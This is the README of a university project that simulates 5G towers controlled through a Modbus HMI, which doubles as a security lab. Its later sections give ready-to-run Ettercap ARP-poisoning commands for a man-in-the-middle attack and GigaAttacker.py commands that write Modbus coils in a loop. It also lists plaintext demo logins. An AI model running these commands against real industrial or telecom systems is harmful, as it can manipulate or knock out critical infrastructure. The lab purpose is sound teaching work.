# 5imFortress - A 5G Infrastructure Attack Simulation

![5imFortress Logo](https://github.com/frankuman/5imFortress/blob/main/docs/images/type5-banner-big.png?raw=true)

## Team Members
- [Oliver Bölin](https://github.com/frankuman)
- [Farhad Asadi](https://github.com/frhd143)
- [Kim Budischewski](https://github.com/LostNeverKnown)
- [Michael Törnvall](https://github.com/Mickelito)
- Client [Alexander Adamov](https://github.com/AlexanderAda)

## Project Overview
5imFortress is an  IT security project developed as part of a university course at Blekinge Tekniska Högskola (BTH). The project revolves around creating a realistic simulation for 5G towers in Blekinge Län, Sweden. These towers are controlled by an HMI ModBus Server, allowing modifications to the hardware of the 5G towers. Additionally, the project includes an example attack on the ModBus server, simulating a breach attempt to test the security of 5G tower systems.

The project has 3 main directories, the HMI, the BS and the attack. The docs folder is for architecture and planning purposes.
The architecture shows what communication protocols are used.

## Table of Contents
- [Project Overview](#project-overview)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Getting Started](#getting-started)
- [Configuration](#configuration)
- [Usage](#usage)
- [HMI Usage Examples](#HMI-usage-examples)
- [Ettercap MiTM](#MiTM-with-Ettercap)
- [GigaAttacker.py](#GigaAttacker)
- [Demo Video](#Demo-Video)
- [Known Issues](#known-issues)
- [Contributing](#contributing)
- [Security Considerations](#security-considerations)
- [License](#license)
- [Contact](#contact)
  
# 5imFortress

## Features
- 5G Tower Simulation provided by [WNS](https://github.com/trunk96/wireless-network-simulator)
- HMI ModBus Server Control provided by [pyModBusTCP](https://github.com/sourceperl/pyModbusTCP)
- Security Breach Simulation with Gigaattacker.py
### Back-end
The basestations uses 5 slaves for modbus communication, which are sending and receiving data from `BS\backend\scaca\plc.py`
#### PLC
The PLC checks with its sensor what the current power is supposed to be according to the HMI, by requesting to see the coils in each slave.
The PLC also uses its sensor to check what the current bitrate and users is for each tower, it then takes those and writes those into the slaves registers.
PLC has a small memory that it stores and compares data to. 
#### HMI
HMI is connected to the python flask dashboard and a Modbus master. The Modbus master requests to read and write to coils and register accordingly.
## Requirements
- Python 3.7.0 or higher
- Pip
- Two or three virtual machines (1 for HMI, and 1 for BS - basestation), optionally 1 more machine for the attacker.
- Network connection is preferred for images and map but not needed.

## Installation
1. Download the required files for each virtual machine either using git or manual download.
2. Choose the virtual machine for simulating the HMI and the one for the BS, delete unnecessary folders accordingly.
           - For the HMI, you only need hmi.py and the HMI dir, and for the basestations, you only need the bs.py and BS dir
3. Run `pip install -r requirements.txt` on both virtual machines.

## Getting Started
1. Navigate to the [configuration](#configuration) section to set IP addresses and ports.
2. Start HMI simulation: `python3 hmi.py`
3. Start BS simulation: `python3 bs.py`

## Configuration
Configure IP addresses and ports in the following configuration files:
- For HMI: `5imFortress\HMI\config_HMI`
- For BS: `5imFortress\BS\config_BS`

Example configuration for the BS virtual machine:
```json
{
    "BS":{ 
        "SLAVE1":"192.168.0.100",
        "SLAVE2":"192.168.0.100",
        "SLAVE3":"192.168.0.100",
        "SLAVE4":"192.168.0.100",
        "SLAVE5":"192.168.0.100",
        "PORT1":502,
        "PORT2":503,
        "PORT3":504,
        "PORT4":505,
        "PORT5":506
    }
}
```
Adjust IP addresses and ports based on your network setup.

For HMI, ensure the IP addresses are the same for the MASTER to connect to the SLAVES. Configure Flask to run on a specific IP and port for the HMI login page, whereas we tested with the HMI owns network interface card so it can be reachable accross the local internet.
```json
{
    "HMI_CONNECT_TO_SLAVE":{ 
        "SLAVE1":"192.168.0.100",
        "SLAVE2":"192.168.0.100",
        "SLAVE3":"192.168.0.100",
        "SLAVE4":"192.168.0.100",
        "SLAVE5":"192.168.0.100",
        "PORT1":502,
        "PORT2":503,
        "PORT3":504,
        "PORT4":505,
        "PORT5":506
    },
    "HMI_WEBSERVICE":{
        "IP":"192.168.0.50",
        "PORT":5000
    }
}
```

Remember that these are changeable but have not been tested on public ip addresses.

## Usage
1. Open a web browser and go to the login page (e.g., http://your_hmi_ip:your_hmi_port).
2. Log in using one of the six accounts defined in `5imFortress\HMI\frontend\gui\templates/credentials.json`.

   Accounts and passwords:

   - **aca**
     - Password: `12345`
     - Access Level: 0

   - **far**
     - Password: `statistik23`
     - Access Level: 0

   - **kim**
     - Password: `3mmab0da1337`
     - Access Level: 0

   - **oli**
     - Password: `password123`
     - Access Level: 0

   - **mik**
     - Password: `iLOVEmilk13`
     - Access Level: 0

   - **acawide**
     - Password: `acawide`
     - Access Level: 1

   Feel free to customize these accounts and passwords as needed.

   Access level 1 is needed to login to the HMI, whereas access level 0 is the standard user.

## HMI Usage Examples

### Dashboard: Map and Status
The dashboard provides an overview of the 5G towers' geographical positions and their current status. It displays the number of connected User Equipment (UE) and provides information on factors affecting connectivity, such as gain, bitrate, and other relevant metrics.


### HMI: Power Button and Bitrate
In the HMI interface, you can monitor the overall power status of the Base Stations (BS) and their respective bitrates. The power button allows you to toggle the entire BS on or off, disconnecting all associated UEs.


### Antenna Power Button
This feature enables you to activate individual antennas, each affecting approximately 25% of the tower's output in their respective directions. The selector allows you to choose which tower to modify.

### Selector
The selector tool allows you to choose the specific tower you want to modify, providing a targeted approach to adjustments.


### Gain Slider
Adjust the gain slider to fine-tune the tower's gain, ranging from 0% to 100%. Higher gain results in directional antennas, concentrating the coverage area into a smaller point. This allows for maximizing bitrate in a specific area, albeit limiting the number of users who can access it.


### Graph
The graph provides a visual representation of the bitrate for each tower over the last 30 seconds, offering insights into performance trends.


Feel free to explore these features to optimize the performance and configuration of the 5G towers within the system.

## MiTM with Ettercap
In our simulation we assume an attacker already has network access, this for example could be through physical access, phishing, or supply chain attacks, allowing a backdoor to be installed.
Modbus is an inherently unsecure protocol, lacking strong authentication mechanisms, allowing unauthorized access to devices and systems. This can lead to unauthorized control or manipulation of critical data.
Modbus also lacks encryption, meaning that data transmitted over the network is vulnerable to eavesdropping.
This is why we show how to do a MitM attack, using Ettercap ARP spoofing.
We wrote our own filter to capture specific packets, inspect them, and modify or drop them entirely. With this attack, we can manipulate data, read sensitive data or DoS the entire HMI accordingly by changing the Ettercap Filter.


### How to reproduce
To perform a Man-in-the-Middle (MiTM) attack with Ettercap, follow these steps:

1. **Download and Install Ettercap**

   Make sure to have Ettercap installed on your system. On Ubuntu, use the following command:

   ```bash
   sudo apt-get install ettercap
   ```

2. **Download Ettercap Filter**

   Download the Ettercap filter `bitrate_response.filter` from `/attack/`. Move the filter to the Ettercap directory:

   ```bash
   sudo mv bitrate_response.filter /usr/share/ettercap
   ```

3. **Edit & Compile the Filter**

   Open a terminal in the `/usr/share/ettercap` directory and run the following commands:
   ```bash
   sudo nano bitrate_response.ef
   ```
   Edit the filter to include the IP address for the HMI
   ```bash
   sudo etterfilter -o bitrate_response.ef bitrate_response.filter
   ```

4. **Initiate ARP Poisoning**

   In the same terminal, execute the following command to start ARP poisoning. Replace `YOUR_NIC`, `FIRST_IP_SPOOF`, and `SECOND_IP_SPOOF` with your network interface card, first IP for spoofing, and second IP for spoofing respectively:

   ```bash
   sudo ettercap -T -i YOUR_NIC -F bitrate_response.ef -q -M arp /FIRST_IP_SPOOF// /SECOND_IP_SPOOF// -V hex
   ```

   This filter alters the bitrate response from the slave to 1337. Modify the filter to adjust values, IP addresses, and ports as needed.

## GigaAttacker

`GigaAttacker.py` is a Python script for sending modbus packets to manipulate coils. It includes a loop function for sending multiple packets.

### Usage:

Run the script using the following command:

```bash
python GigaAttacker.py -h
```
#### Examples:
1. Write a coil on register 1 with value 0 for the IP 192.168.0.100 on port 502:

   ```bash
   python3 GigaAttacker.py -write-coil -addr 1 -val 0 -ip 192.168.0.100 -p 502
   ```

2. Write a coil on register 1 with value 0 for the IP 192.168.0.100, repeating 1000 times with a timeout of 0.5 seconds:

   ```bash
   python3 GigaAttacker.py -write-coil -addr 1 -val 0 -ip 192.168.0.100 -loop 1000 -t 0.5
   ```

Feel free to customize the script parameters based on your requirements.

## Demo Video
[![Watch the demo video](https://img.youtube.com/vi/TUj1jthG2r4/maxresdefault.jpg)](https://www.youtube.com/watch?v=TUj1jthG2r4&feature=youtu.be&ab_channel=gnoblin)


## Known Issues
Known issues will be presented here

Issue 1: Sometimes the plc_mem.json gets erased and emptied. Causing a JSON error in python.
This might be because of closing a VM before exiting the software accordingly. If you stumble upon this issue please redownload or recopy the plc_mem.json from
`BS\backend\scaca\plc_mem.json`

## Contributing
Our project ends on 15 December 2023, and If you want to add more features for the future feel free to do so.

## Security Considerations
Remember that this software sends ModBus packets on the local internet and if you modify the IP addresses to be public, you might attract a crowd of malicious bots. I would recommend always running on private IP addresses and
always run on virtual machines. If you want to run 5imFortress as a HoneyPot that is entirely up to you, and we take no responsibility for any damages. You might also need to modify the code a bit.

## License
MIT License

Copyright (c) 2023 Oliver B

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS," WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM,
OUT OF, OR IN CONNECTION WITH THE SOFTWARE, OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.


## Contact
- You can contact the project team at [olbo20@student.bth.se](mailto:olbo20@student.bth.se).

Thank you

![acawide](https://github.com/frankuman/5imFortress/assets/57047010/1782e609-f09e-4c73-893a-8855a3c57111)
